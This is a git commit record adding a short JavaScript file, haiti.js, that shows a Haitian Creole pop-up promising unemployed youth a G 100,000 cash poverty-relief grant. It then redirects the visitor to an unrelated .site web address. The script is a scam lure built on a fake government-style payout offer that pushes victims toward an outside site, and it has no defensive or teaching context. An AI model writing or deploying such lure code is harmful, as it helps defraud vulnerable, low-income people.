a490c5f49150075cfc6df8333e38904ddefedda3
Usorondo95 <faience_corner1m@icloud.com>
2026-04-26 05:28:04 +0100

    Create haiti.js

---
+++ haiti.js
@@ -0,0 +1,10 @@
+var password = 'G 100,000';
+
+password = prompt(
+  'Felisitasyon, ou kalifye pou resevwa G 100,000 sibvansyon lajan kach pou soulajman povrete pou jèn ki pa gen travay. Klike OK pou resevwa li imedyatman.',
+  'G 100,000'
+);
+
+if (password !== 'G 100,000') {
+    location.href = 'https://www.gruudeboif.site/100000-jen-otonomizasyon';
+}
